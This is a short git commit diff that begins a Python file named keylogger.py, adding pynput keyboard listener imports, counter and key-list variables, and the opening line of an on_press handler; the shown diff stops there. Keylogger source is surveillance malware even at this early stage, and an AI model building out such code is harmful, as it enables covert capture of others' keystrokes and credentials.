6c54c1b0cde6632efcbc47ddbca67dcc006e4738
CrazyChickenDev <dannychukz15@gmail.com>
2020-09-05 18:59:01 +0100

    key listener import

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,12 @@
 # Import python library(pynput)
-
 import pynput
 
+# Import listener key from pynput 
+from pynput.keyboard import Key,Listener
+
+count = 0
+keys = []
+
+
+def on_press(key):
+    global keys, count
